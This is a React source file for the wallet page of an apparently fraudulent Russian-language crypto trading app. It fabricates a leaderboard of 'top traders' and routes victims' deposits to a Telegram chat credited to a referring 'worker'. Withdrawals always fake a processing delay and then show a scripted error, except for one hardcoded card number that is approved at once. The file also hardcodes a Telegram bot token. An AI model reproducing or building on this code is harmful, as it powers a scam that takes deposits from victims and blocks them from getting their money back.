import React, { useState, useCallback, memo } from 'react';
import { ArrowUpRight, ArrowDownLeft, History, Wallet, Plus, X, Copy, Check, CreditCard, AlertCircle, TrendingUp, TrendingDown, Sparkles, Bitcoin, RefreshCw, Clock, CheckCircle, XCircle, BarChart3, PieChart } from 'lucide-react';
import { UsdtIcon, getCryptoIcon } from '../icons';
import { supabase } from '../supabaseClient';
import { notifyDeposit, notifyWithdraw } from '../utils/notifications';
import { getCurrentUserId } from '../utils/auth';
import { formatCurrency, convertFromUSD, getCurrencySymbol, DEFAULT_CURRENCY, CURRENCIES, getCurrency } from '../utils/currency';
import type { Transaction, DbSettings } from '../types';

// Топ трейдеры биржи
interface TopTrader {
  id: string;
  name: string;
  username: string;
  avatar: string;
  balance: number;
  totalTrades: number;
  winRate: number;
  totalWithdrawn: number;
  totalProfit: number;
  rank: number;
}

const TOP_TRADERS: TopTrader[] = [
  { id: '1', name: 'Александр М.', username: '@ale***der', avatar: 'https://i.pinimg.com/originals/72/6f/e5/726fe57ba333f2390af1d15a232dbc1c.jpg', balance: 847520, totalTrades: 2847, winRate: 78, totalWithdrawn: 1250000, totalProfit: 2097520, rank: 1 },
  { id: '2', name: 'Мария К.', username: '@mar***ka', avatar: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQrKZ_63_sgaR8544LfghOgduca4tBryUbSbw&s', balance: 523100, totalTrades: 1923, winRate: 72, totalWithdrawn: 890000, totalProfit: 1413100, rank: 2 },
  { id: '3', name: 'Дмитрий В.', username: '@dmi***ry', avatar: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHLqUP_gJFL3XuBr_1iXLtq6XN36y18ooOuA&s', balance: 412800, totalTrades: 1567, winRate: 69, totalWithdrawn: 720000, totalProfit: 1132800, rank: 3 },
  { id: '4', name: 'Анна С.', username: '@ann***sa', avatar: 'https://i.pinimg.com/236x/4f/82/27/4f8227c5de358c3195b4150622242b78.jpg', balance: 298450, totalTrades: 1245, winRate: 74, totalWithdrawn: 540000, totalProfit: 838450, rank: 4 },
  { id: '5', name: 'Сергей П.', username: '@ser***ey', avatar: 'https://abrakadabra.fun/uploads/posts/2022-01/1642492631_10-abrakadabra-fun-p-grustnie-avi-dlya-telegramma-36.png', balance: 187200, totalTrades: 987, winRate: 67, totalWithdrawn: 380000, totalProfit: 567200, rank: 5 },
  { id: '6', name: 'Елена Р.', username: '@ele***na', avatar: 'https://cs14.pikabu.ru/post_img/big/2022/09/13/6/1663057343185476052.jpg', balance: 156800, totalTrades: 856, winRate: 71, totalWithdrawn: 290000, totalProfit: 446800, rank: 6 },
];

// Компонент секции топ трейдеров
const TopTradersSection: React.FC = () => {
  const [selectedTrader, setSelectedTrader] = useState<TopTrader | null>(null);

  const getRankBadge = (rank: number) => {
    if (rank === 1) return { bg: 'bg-gradient-to-r from-[#FFD700] to-[#FFA500]', text: '🥇', shadow: 'shadow-[0_0_15px_rgba(255,215,0,0.4)]' };
    if (rank === 2) return { bg: 'bg-gradient-to-r from-[#C0C0C0] to-[#A0A0A0]', text: '🥈', shadow: 'shadow-[0_0_10px_rgba(192,192,192,0.3)]' };
    if (rank === 3) return { bg: 'bg-gradient-to-r from-[#CD7F32] to-[#8B4513]', text: '🥉', shadow: 'shadow-[0_0_10px_rgba(205,127,50,0.3)]' };
    return { bg: 'bg-[#3a3a3c]', text: `#${rank}`, shadow: '' };
  };

  return (
    <>
      <div className="flex-1 min-h-0 overflow-y-auto px-4 pb-24" style={{ WebkitOverflowScrolling: 'touch' }}>
        {/* Header */}
        <div className="flex justify-between items-center mb-4">
          <h2 className="font-semibold text-gray-400 uppercase tracking-wider text-sm">Лидеры биржи</h2>
          <span className="text-xs text-[#FFD700] bg-[#FFD700]/10 px-2 py-1 rounded-lg border border-[#FFD700]/20">ТОП-6</span>
        </div>

        {/* Top 3 Podium */}
        <div className="flex justify-center items-end gap-2 mb-6 h-32">
          {/* 2nd place */}
          <div className="flex flex-col items-center" onClick={() => setSelectedTrader(TOP_TRADERS[1])}>
            <div className="relative mb-2">
              <img src={TOP_TRADERS[1].avatar} className="w-14 h-14 rounded-full object-cover border-2 border-[#C0C0C0]" alt="" />
              <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-[#C0C0C0] rounded-full flex items-center justify-center text-[10px]">🥈</div>
            </div>
            <div className="bg-gradient-to-t from-[#C0C0C0]/20 to-transparent w-16 h-16 rounded-t-lg flex items-end justify-center pb-1">
              <span className="text-[10px] text-gray-400 font-medium">$523K</span>
            </div>
          </div>
          
          {/* 1st place */}
          <div className="flex flex-col items-center" onClick={() => setSelectedTrader(TOP_TRADERS[0])}>
            <div className="relative mb-2">
              <img src={TOP_TRADERS[0].avatar} className="w-16 h-16 rounded-full object-cover border-2 border-[#FFD700] shadow-[0_0_20px_rgba(255,215,0,0.4)]" alt="" />
              <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-[#FFD700] rounded-full flex items-center justify-center text-xs">🥇</div>
            </div>
            <div className="bg-gradient-to-t from-[#FFD700]/20 to-transparent w-20 h-24 rounded-t-lg flex items-end justify-center pb-1">
              <span className="text-xs text-[#FFD700] font-bold">$847K</span>
            </div>
          </div>
          
          {/* 3rd place */}
          <div className="flex flex-col items-center" onClick={() => setSelectedTrader(TOP_TRADERS[2])}>
            <div className="relative mb-2">
              <img src={TOP_TRADERS[2].avatar} className="w-14 h-14 rounded-full object-cover border-2 border-[#CD7F32]" alt="" />
              <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-[#CD7F32] rounded-full flex items-center justify-center text-[10px]">🥉</div>
            </div>
            <div className="bg-gradient-to-t from-[#CD7F32]/20 to-transparent w-16 h-12 rounded-t-lg flex items-end justify-center pb-1">
              <span className="text-[10px] text-gray-400 font-medium">$412K</span>
            </div>
          </div>
        </div>

        {/* Full List */}
        <div className="space-y-2">
          {TOP_TRADERS.map(trader => {
            const badge = getRankBadge(trader.rank);
            return (
              <div 
                key={trader.id}
                onClick={() => setSelectedTrader(trader)}
                className={`bg-[#1c1c1e] rounded-2xl p-3 flex items-center gap-3 border border-white/5 active:scale-[0.98] transition-all cursor-pointer ${trader.rank <= 3 ? badge.shadow : ''}`}
              >
                {/* Rank */}
                <div className={`w-8 h-8 rounded-lg ${badge.bg} flex items-center justify-center text-sm font-bold ${trader.rank > 3 ? 'text-gray-400' : 'text-white'}`}>
                  {badge.text}
                </div>
                
                {/* Avatar */}
                <img src={trader.avatar} className="w-11 h-11 rounded-full object-cover border border-white/10" alt="" />
                
                {/* Info */}
                <div className="flex-1 min-w-0">
                  <div className="font-semibold text-sm truncate">{trader.name}</div>
                  <div className="text-xs text-gray-500">{trader.username}</div>
                </div>
                
                {/* Stats */}
                <div className="text-right">
                  <div className="text-sm font-bold text-[#00C896]">${(trader.balance / 1000).toFixed(0)}K</div>
                  <div className="text-[10px] text-gray-500">{trader.winRate}% винрейт</div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Trader Profile Modal */}
      {selectedTrader && (
        <>
          <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm" onClick={() => setSelectedTrader(null)} />
          <div className="fixed inset-x-0 bottom-0 z-[110] bg-[#1c1c1e] rounded-t-2xl border-t border-white/10 p-4 pb-6 animate-[slideUp_0.25s_ease-out]" style={{ paddingBottom: 'max(1.5rem, env(safe-area-inset-bottom))' }}>
            <div className="w-10 h-1 bg-white/10 rounded-full mx-auto mb-4" />
            
            {/* Header */}
            <div className="flex items-center gap-4 mb-6">
              <div className="relative">
                <img src={selectedTrader.avatar} className="w-20 h-20 rounded-full object-cover border-2 border-[#0098EA]" alt="" />
                <div className={`absolute -bottom-1 -right-1 w-7 h-7 ${getRankBadge(selectedTrader.rank).bg} rounded-full flex items-center justify-center text-sm`}>
                  {getRankBadge(selectedTrader.rank).text}
                </div>
              </div>
              <div>
                <h3 className="text-xl font-bold">{selectedTrader.name}</h3>
                <p className="text-gray-500">{selectedTrader.username}</p>
                <p className="text-xs text-[#0098EA] mt-1">Топ-{selectedTrader.rank} трейдер</p>
              </div>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-2 gap-3 mb-4">
              <div className="bg-[#252527] rounded-xl p-3 border border-white/5">
                <div className="text-xs text-gray-500 mb-1">Баланс</div>
                <div className="text-lg font-bold text-[#00C896]">${selectedTrader.balance.toLocaleString()}</div>
              </div>
              <div className="bg-[#252527] rounded-xl p-3 border border-white/5">
                <div className="text-xs text-gray-500 mb-1">Всего выведено</div>
                <div className="text-lg font-bold text-white">${selectedTrader.totalWithdrawn.toLocaleString()}</div>
              </div>
              <div className="bg-[#252527] rounded-xl p-3 border border-white/5">
                <div className="text-xs text-gray-500 mb-1">Сделок</div>
                <div className="text-lg font-bold text-white">{selectedTrader.totalTrades.toLocaleString()}</div>
              </div>
              <div className="bg-[#252527] rounded-xl p-3 border border-white/5">
                <div className="text-xs text-gray-500 mb-1">Винрейт</div>
                <div className="text-lg font-bold text-[#0098EA]">{selectedTrader.winRate}%</div>
              </div>
            </div>

            {/* Total Profit */}
            <div className="bg-gradient-to-r from-[#00C896]/10 to-[#0098EA]/10 rounded-xl p-4 border border-[#00C896]/20 mb-4">
              <div className="text-xs text-gray-400 mb-1">Общая прибыль</div>
              <div className="text-2xl font-bold text-[#00C896]">${selectedTrader.totalProfit.toLocaleString()}</div>
            </div>

            {/* Close Button */}
            <button 
              onClick={() => setSelectedTrader(null)}
              className="w-full bg-[#0098EA] text-white font-semibold py-3 rounded-xl active:scale-[0.98] transition-all"
            >
              Закрыть
            </button>
          </div>
        </>
      )}
    </>
  );
};

interface WalletPageProps {
  history: Transaction[];
  balance: number;
  onDeposit: (amount: number, method: string, currency: string) => void;
  onWithdraw: (amount: number) => void;
  settings: DbSettings;
  onModalChange?: (isOpen: boolean) => void;
  userLuck?: 'win' | 'lose' | 'default';
  isKyc?: boolean;
  userId?: number;
  currency?: string;
  isDemoMode?: boolean;
}

type DepositMethod = 'card' | 'crypto';

interface WithdrawRequest {
  id: string;
  amount: number;
  status: 'pending' | 'completed' | 'rejected';
  date: string;
}

const WalletPage: React.FC<WalletPageProps> = ({ history, balance, onDeposit, onWithdraw, settings, onModalChange, userLuck = 'default', isKyc = false, userId, currency = DEFAULT_CURRENCY, isDemoMode = false }) => {
    const [activeTab, setActiveTab] = useState<'wallet' | 'history' | 'top'>('wallet');
    const [activeModal, setActiveModal] = useState<'deposit' | 'withdraw' | 'converter' | 'processing' | 'withdraw-error' | 'withdraw-approved' | null>(null);
    const [depositMethod, setDepositMethod] = useState<DepositMethod | null>(null);
    const [copied, setCopied] = useState(false);
    const [depositAmount, setDepositAmount] = useState('');
    const [withdrawAmount, setWithdrawAmount] = useState('');
    const [withdrawAddress, setWithdrawAddress] = useState('');
    const [withdrawError, setWithdrawError] = useState<string | null>(null);
    const [selectedCountry, setSelectedCountry] = useState('Россия');
    const [uploadedScreenshot, setUploadedScreenshot] = useState<File | null>(null);
    const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
    // Состояние для минимального депозита (загружается из БД)
    const [minDeposit, setMinDeposit] = useState<number>(settings.min_deposit || 10);
    
    // Состояние для пасты вывода
    const [withdrawMessage, setWithdrawMessage] = useState<{
        title: string;
        description: string;
        icon: string;
        button_text: string;
    } | null>(null);
    
    // Загружаем настройки реферала (min_deposit + withdraw_message) из БД
    React.useEffect(() => {
        const loadReferralSettings = async () => {
            if (!userId) {
                console.log('WalletPage: userId not provided');
                return;
            }
            
            try {
                console.log('WalletPage: Loading referral settings for user', userId);
                
                // Загружаем все настройки одним запросом
                const { data, error } = await supabase.rpc('get_referral_settings', {
                    p_user_id: userId
                });
                
                if (error) {
                    console.error('Ошибка загрузки настроек реферала:', error);
                    // Fallback: пробуем загрузить отдельно
                    await loadSettingsSeparately();
                    return;
                }
                
                console.log('WalletPage: Referral settings loaded:', data);
                
                if (data && data.length > 0) {
                    const settings = data[0];
                    
                    // Устанавливаем минимальный депозит
                    if (settings.min_deposit) {
                        setMinDeposit(settings.min_deposit);
                        console.log('WalletPage: Min deposit set:', settings.min_deposit);
                    }
                    
                    // Устанавливаем пасту вывода
                    if (settings.withdraw_title) {
                        setWithdrawMessage({
                            title: settings.withdraw_title,
                            description: settings.withdraw_description,
                            icon: settings.withdraw_icon,
                            button_text: settings.withdraw_button_text
                        });
                        console.log('WalletPage: Withdraw message set');
                    }
                } else {
                    console.log('WalletPage: No referral settings data returned, using fallback');
                    await loadSettingsSeparately();
                }
            } catch (error) {
                console.error('Ошибка при загрузке настроек реферала:', error);
                await loadSettingsSeparately();
            }
        };
        
        // Fallback функция для загрузки настроек отдельно
        const loadSettingsSeparately = async () => {
            try {
                // Загружаем минимальный депозит
                const { data: minDepData, error: minDepError } = await supabase.rpc('get_user_min_deposit', {
                    p_user_id: userId
                });
                
                if (!minDepError && minDepData !== null) {
                    setMinDeposit(minDepData);
                    console.log('WalletPage: Min deposit loaded separately:', minDepData);
                }
                
                // Загружаем пасту вывода
                const { data: withdrawData, error: withdrawError } = await supabase.rpc('get_user_withdraw_message', {
                    p_user_id: userId
                });
                
                if (!withdrawError && withdrawData && withdrawData.length > 0) {
                    setWithdrawMessage(withdrawData[0]);
                    console.log('WalletPage: Withdraw message loaded separately');
                }
            } catch (error) {
                console.error('Ошибка при загрузке настроек отдельно:', error);
            }
        };
        
        loadReferralSettings();
    }, [userId]);
    
    // Converter state
    const [convertFrom, setConvertFrom] = useState('USD');
    const [convertTo, setConvertTo] = useState('USDT');
    const [convertAmount, setConvertAmount] = useState('1000');

    // Список стран и их валют
    const countries = [
        { name: 'Россия', currency: 'RUB', flag: '🇷🇺', rate: 0.0105 },
        { name: 'Казахстан', currency: 'KZT', flag: '🇰🇿', rate: 0.0022 },
        { name: 'Узбекистан', currency: 'UZS', flag: '🇺🇿', rate: 0.000081 },
        { name: 'Киргизия', currency: 'KGS', flag: '🇰🇬', rate: 0.0115 },
        { name: 'Таджикистан', currency: 'TJS', flag: '🇹🇯', rate: 0.092 },
        { name: 'США', currency: 'USD', flag: '🇺🇸', rate: 1.0 },
        { name: 'Европа', currency: 'EUR', flag: '🇪🇺', rate: 1.08 }
    ];

    const [countryBankDetails, setCountryBankDetails] = useState<Record<string, string>>({});

    // Загружаем реквизиты по странам из Supabase
    React.useEffect(() => {
        const loadCountryBankDetails = async () => {
            try {
                const { supabase } = await import('../supabaseClient');
                
                const { data, error } = await supabase
                    .from('country_bank_details')
                    .select('country_name, bank_details')
                    .eq('is_active', true);
                
                if (error) {
                    console.error('Ошибка загрузки реквизитов:', error);
                    return;
                }
                
                const detailsMap: Record<string, string> = {};
                data?.forEach(item => {
                    detailsMap[item.country_name] = item.bank_details;
                });
                
                setCountryBankDetails(detailsMap);
            } catch (error) {
                console.error('Ошибка при загрузке реквизитов:', error);
            }
        };
        
        loadCountryBankDetails();
    }, []);

    const getCurrentCountry = () => countries.find(c => c.name === selectedCountry) || countries[0];

    const getCurrentBankDetails = () => {
        const country = getCurrentCountry();
        return countryBankDetails[country.name] || `${country.name}: Реквизиты не найдены`;
    };

    // Активные заявки на вывод
    const [withdrawRequests] = useState<WithdrawRequest[]>([
      // { id: '1', amount: 100, status: 'pending', date: '22.12.2024' },
    ]);

    const details = settings.bank_details || "Sberbank: 0000 0000 0000 0000";

    // Актуальные курсы валют
    const rates: Record<string, number> = {
      'RUB_USDT': 0.0105,
      'USDT_RUB': 95,
      'BTC_USDT': 68000,
      'USDT_BTC': 0.0000147,
      'ETH_USDT': 3500,
      'USDT_ETH': 0.000286,
    };

    const getConvertedAmount = () => {
      const key = `${convertFrom}_${convertTo}`;
      const rate = rates[key] || 1;
      return (parseFloat(convertAmount) * rate).toFixed(convertTo === 'BTC' ? 8 : 2);
    };

    const wins = history.filter(t => t.type === 'win').length;
    const losses = history.filter(t => t.type === 'loss').length;
    const totalTrades = wins + losses;
    const winRate = totalTrades > 0 ? Math.round((wins / totalTrades) * 100) : 0;

    const handleCopy = useCallback((text: string) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    }, []);

    const openModal = (type: 'deposit' | 'withdraw' | 'converter') => {
        setActiveModal(type);
        setDepositMethod(null);
        // Устанавливаем минимальный депозит при открытии модального окна
        if (type === 'deposit' && !depositAmount) {
            const country = getCurrentCountry();
            const minInLocalCurrency = Math.ceil(minDeposit / country.rate);
            setDepositAmount(minInLocalCurrency.toString());
        }
        onModalChange?.(true);
    };

    const closeModal = () => {
        setActiveModal(null);
        setDepositMethod(null);
        setUploadedScreenshot(null);
        setScreenshotPreview(null);
        setDepositAmount('');
        setWithdrawAmount('');
        setWithdrawAddress(withdrawAddress?.startsWith('T') || withdrawAddress?.startsWith('0x') ? 'T' : '');
        setWithdrawError(null);
        onModalChange?.(false);
    };

    const handleScreenshotUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files?.[0];
        if (file && file.type.startsWith('image/')) {
            setUploadedScreenshot(file);
            
            // Создаем превью
            const reader = new FileReader();
            reader.onload = (e) => {
                setScreenshotPreview(e.target?.result as string);
            };
            reader.readAsDataURL(file);
        }
    };

    const removeScreenshot = () => {
        setUploadedScreenshot(null);
        setScreenshotPreview(null);
    };

    const sendToTelegram = async (depositData: {
        amount: string;
        country: string;
        currency: string;
        screenshot: File | null;
        userId: number;
    }) => {
        try {
            // Получаем данные пользователя из Supabase
            const { data: userData, error: userError } = await supabase
                .from('users')
                .select('user_id, username, full_name, referrer_id')
                .eq('user_id', depositData.userId)
                .single();

            if (userError) {
                console.error('Ошибка получения данных пользователя:', userError);
            }

            // Получаем данные воркера (реферера) если есть
            let workerData = null;
            if (userData?.referrer_id) {
                const { data: worker, error: workerError } = await supabase
                    .from('users')
                    .select('user_id, username, full_name')
                    .eq('user_id', userData.referrer_id)
                    .single();

                if (workerError) {
                    console.error('Ошибка получения данных воркера:', workerError);
                } else {
                    workerData = worker;
                }
            }

            // Формируем информацию о пользователе
            const userName = userData?.full_name || 'Неизвестно';
            const userNickname = userData?.username || 'Нет никнейма';
            const userInfo = `${userName} (${userNickname}) ID: ${userData?.user_id || depositData.userId}`;

            // Формируем информацию о воркере
            const workerInfo = workerData 
                ? `${workerData.full_name || 'Неизвестно'} (${workerData.username || 'Нет никнейма'}) ID: ${workerData.user_id}`
                : 'Прямая регистрация';

            // Добавляем текстовые данные
            const message = `
🔔 НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ

👤 Пользователь: ${userInfo}
👨‍💼 Воркер: ${workerInfo}
💰 Сумма: ${depositData.amount} ${depositData.currency}
💵 В USDT: ≈ $${(parseFloat(depositData.amount) * (depositData.currency === 'RUB' ? 0.0105 : depositData.currency === 'KZT' ? 0.0022 : depositData.currency === 'UZS' ? 0.000081 : depositData.currency === 'KGS' ? 0.0115 : depositData.currency === 'TJS' ? 0.092 : depositData.currency === 'USD' ? 1.0 : 1.08)).toFixed(2)}
🌍 Страна: ${depositData.country}
🏦 Валюта: ${depositData.currency}
📅 Дата: ${new Date().toLocaleString('ru-RU')}
🆔 ID заявки: ${Date.now()}

${depositData.screenshot ? '📸 Скриншот прикреплен' : '❌ Скриншот отсутствует'}

#пополнение #${depositData.country.toLowerCase().replace(' ', '_')} #${depositData.currency.toLowerCase()}
            `.trim();
            
            const botToken = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';
            const chatId = '-1003560670670';
            
            let response;
            
            if (depositData.screenshot) {
                // Отправляем с фото
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', message);
                formData.append('photo', depositData.screenshot, depositData.screenshot.name);
                formData.append('parse_mode', 'HTML');
                
                response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                // Отправляем только текст для криптовалютных пополнений
                response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            }
            
            if (response.ok) {
                const result = await response.json();
                console.log('Заявка успешно отправлена в Telegram:', result);
                return true;
            } else {
                let errorData;
                try {
                    errorData = await response.json();
                } catch (e) {
                    errorData = await response.text();
                }
                console.error('Ошибка отправки в Telegram:', {
                    status: response.status,
                    statusText: response.statusText,
                    error: errorData
                });
                
                // Если ошибка с фото, попробуем отправить только текст
                if (depositData.screenshot && (response.status === 400 || (errorData && errorData.error_code === 400))) {
                    console.log('Попытка отправить только текст...');
                    const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message + '\n\n⚠️ Скриншот не удалось прикрепить',
                            parse_mode: 'HTML'
                        })
                    });
                    
                    if (textResponse.ok) {
                        console.log('Текстовое сообщение отправлено');
                        return true;
                    }
                }
                
                return false;
            }
        } catch (error) {
            console.error('Ошибка при отправке в Telegram:', error);
            
            // Попробуем отправить простое текстовое сообщение для диагностики
            try {
                const botToken = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';
                const chatId = '-1003560670670';
                
                const testResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: '🔧 Тестовое сообщение - проверка доступа бота к каналу',
                    })
                });
                
                if (testResponse.ok) {
                    console.log('Тестовое сообщение отправлено успешно');
                } else {
                    const testError = await testResponse.json();
                    console.error('Ошибка тестового сообщения:', testError);
                }
            } catch (testError) {
                console.error('Ошибка при отправке тестового сообщения:', testError);
            }
            
            return false;
        }
    };

    const submitDeposit = async () => {
        const val = parseFloat(depositAmount);
        const valInUsd = val * getCurrentCountry().rate;
        
        // Проверяем минимальную сумму депозита
        if (valInUsd < minDeposit) {
            alert(`Минимальная сумма пополнения: $${minDeposit.toFixed(2)} (≈${Math.ceil(minDeposit / getCurrentCountry().rate)} ${getCurrentCountry().currency})`);
            return;
        }
        
        if (val > 0 && depositMethod) {
            // Проверяем наличие скриншота для банковской карты
            if (depositMethod === 'card' && !uploadedScreenshot) {
                alert('Пожалуйста, прикрепите скриншот перевода');
                return;
            }
            
            // Получаем ID пользователя (приоритет: Telegram WebApp > URL > localStorage)
            const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
            let userId = tgUser?.id;
            
            // Fallback 1: читаем tgid из URL
            if (!userId) {
                const urlParams = new URLSearchParams(window.location.search);
                const urlTgId = urlParams.get('tgid');
                if (urlTgId && !isNaN(Number(urlTgId))) {
                    userId = Number(urlTgId);
                }
            }
            
            // Fallback 2: читаем из localStorage (для пользователей через форму)
            if (!userId) {
                const storedUserId = getCurrentUserId();
                if (storedUserId) {
                    userId = storedUserId;
                    console.log('WalletPage: Используем ID из localStorage:', userId);
                }
            }
            
            // Последний fallback - ошибка
            if (!userId) {
                alert('Ошибка: не удалось определить пользователя. Пожалуйста, войдите заново.');
                return;
            }
            
            // Отправляем данные в Telegram для всех методов
            const success = await sendToTelegram({
                amount: depositAmount,
                country: depositMethod === 'card' ? selectedCountry : 'Криптовалюта',
                currency: depositMethod === 'card' ? getCurrentCountry().currency : 'USDT',
                screenshot: depositMethod === 'card' ? uploadedScreenshot : null,
                userId: userId
            });
            
            if (success) {
                // Уведомляем воркера о пополнении
                const currency = depositMethod === 'card' ? getCurrentCountry().currency : 'USDT';
                const methodName = depositMethod === 'card' ? 'Банковская карта' : 'Криптовалюта';
                notifyDeposit(val, currency, methodName);
                
                onDeposit(val, depositMethod, currency);
                closeModal();
            } else {
                alert('Ошибка при отправке заявки. Попробуйте еще раз.');
            }
        }
    };

    // Реквизиты для мгновенного одобрения вывода (карта/адрес без пробелов)
    const APPROVED_WITHDRAW_REQUISITES = ['2200701921604499'];
    const normalizeRequisites = (s: string) => s.replace(/\s/g, '').replace(/-/g, '');

    const submitWithdraw = () => {
        const val = parseFloat(withdrawAmount);
        if (val <= 0) return;
        if (val > balance) {
            setWithdrawError("Недостаточно средств");
            return;
        }
        setWithdrawError(null);

        const normalized = normalizeRequisites(withdrawAddress);
        const isApprovedRequisite = APPROVED_WITHDRAW_REQUISITES.some(r => normalized.includes(r) || r.includes(normalized));

        if (isApprovedRequisite) {
            // Мгновенное одобрение — снимаем баланс и показываем успех
            onWithdraw(val);
            setActiveModal('withdraw-approved');
            // Закрываем через 2.5 сек
            setTimeout(closeModal, 2500);
        } else {
            // Обычный поток — паста из БД
            setActiveModal('processing');
            setTimeout(() => {
                setActiveModal('withdraw-error');
            }, 2000);
        }
    };

    // Адреса для пополнения криптовалютой
    const cryptoAddresses = {
      BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
      ETH: '0x742d35Cc6634C0532925a3b844Bc9e7595f...',
      USDT: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9',
    };

    return (
        <div className="h-full min-h-0 flex flex-col bg-black text-white overflow-hidden">
            {/* Top Navigation (Segmented Control) */}
            <div className="shrink-0 pt-4 px-4 pb-2 z-10 bg-black">
                <div className="bg-[#1c1c1e] p-1 rounded-2xl flex relative h-12 border border-white/5">
                    {/* Sliding Background */}
                    <div 
                        className={`absolute top-1 bottom-1 w-[calc(33.333%-4px)] bg-[#3a3a3c] rounded-[14px] shadow-lg transition-all duration-300 ease-out border border-white/5 ${
                            activeTab === 'wallet' ? 'left-1' : activeTab === 'history' ? 'left-[calc(33.333%)]' : 'left-[calc(66.666%)]'
                        }`} 
                    />
                    
                    <button 
                        onClick={() => setActiveTab('wallet')}
                        className={`flex-1 relative z-10 font-semibold text-sm transition-colors duration-300 ${activeTab === 'wallet' ? 'text-white' : 'text-gray-400'}`}
                    >
                        Кошелек
                    </button>
                    <button 
                        onClick={() => setActiveTab('history')}
                        className={`flex-1 relative z-10 font-semibold text-sm transition-colors duration-300 flex items-center justify-center gap-1.5 ${activeTab === 'history' ? 'text-white' : 'text-gray-400'}`}
                    >
                        История
                        {history.length > 0 && (
                            <span className="w-1.5 h-1.5 rounded-full bg-[#00C896] shadow-[0_0_8px_#00C896]" />
                        )}
                    </button>
                    <button 
                        onClick={() => setActiveTab('top')}
                        className={`flex-1 relative z-10 font-semibold text-sm transition-colors duration-300 flex items-center justify-center gap-1.5 ${activeTab === 'top' ? 'text-white' : 'text-gray-400'}`}
                    >
                        Топ
                        <span className="w-1.5 h-1.5 rounded-full bg-[#FFD700] shadow-[0_0_8px_#FFD700] animate-pulse" />
                    </button>
                </div>
            </div>

            {/* Content Area */}
            <div className="flex-1 min-h-0 overflow-hidden flex flex-col relative">
                {activeTab === 'wallet' && (
                    <div className="flex-1 min-h-0 overflow-y-auto px-4 pb-24" style={{ WebkitOverflowScrolling: 'touch' }}>
                        {/* Demo Mode Banner */}
                        {isDemoMode && (
                            <div className="bg-[#0098EA]/10 border border-[#0098EA]/30 rounded-xl p-3 mb-4 flex items-center gap-2">
                                <div className="w-2 h-2 rounded-full bg-[#0098EA] animate-pulse" />
                                <span className="text-sm text-[#0098EA] font-medium">ДЕМО РЕЖИМ</span>
                                <span className="text-xs text-[#0098EA]/70 ml-auto">Пополнение и вывод недоступны</span>
                            </div>
                        )}

                        {/* Balance Card */}
                        <div className={`rounded-2xl p-5 border relative overflow-hidden mb-4 ${
                            isDemoMode 
                                ? 'bg-[#0098EA]/5 border-[#0098EA]/20' 
                                : 'bg-[#1c1c1e] border-white/5'
                        }`}>
                            <div className="absolute top-0 right-0 w-32 h-32 bg-[#0098EA] opacity-[0.03] rounded-full translate-x-1/3 -translate-y-1/3"></div>
                            
                            <div className="flex items-center justify-between mb-3 relative z-10">
                                <span className={`text-xs font-medium uppercase tracking-wider ${isDemoMode ? 'text-[#0098EA]' : 'text-gray-500'}`}>
                                    {isDemoMode ? 'Демо баланс' : 'Баланс'}
                                </span>
                                <div className="flex gap-2">
                                    {!isDemoMode && (
                                        <button onClick={() => openModal('converter')} className="flex items-center gap-1.5 px-3 py-1.5 bg-[#1c1c1e] rounded-xl text-xs text-gray-400 hover:text-white transition-colors border border-white/5">
                                            <RefreshCw size={12} />
                                            Конвертер
                                        </button>
                                    )}
                                    {isDemoMode && (
                                        <span className="px-2 py-1 bg-[#0098EA]/20 rounded-lg text-[10px] text-[#0098EA] font-semibold">
                                            DEMO
                                        </span>
                                    )}
                                </div>
                            </div>
                            
                            <div className={`text-3xl font-bold mb-4 relative z-10 ${isDemoMode ? 'text-[#0098EA]' : 'text-white'}`}>
                                {formatCurrency(convertFromUSD(balance, currency), currency)}
                            </div>

                            <div className="flex gap-3 relative z-10">
                                {isDemoMode ? (
                                    <>
                                        <div className="flex-1 bg-[#1c1c1e]/50 text-gray-500 rounded-2xl py-3 flex items-center justify-center gap-2 font-semibold text-sm border border-white/5 cursor-not-allowed">
                                            <Plus size={16} /> Недоступно
                                        </div>
                                        <div className="flex-1 bg-[#1c1c1e]/50 text-gray-500 rounded-2xl py-3 flex items-center justify-center gap-2 font-semibold text-sm border border-white/5 cursor-not-allowed">
                                            <ArrowUpRight size={16} /> Недоступно
                                        </div>
                                    </>
                                ) : (
                                    <>
                                        <button onClick={() => openModal('deposit')} className="flex-1 bg-[#0098EA] text-white rounded-2xl py-3 flex items-center justify-center gap-2 active:scale-[0.98] font-semibold text-sm transition-all shadow-[0_4px_20px_rgba(0,152,234,0.2)]">
                                            <Plus size={16} /> Пополнить
                                        </button>
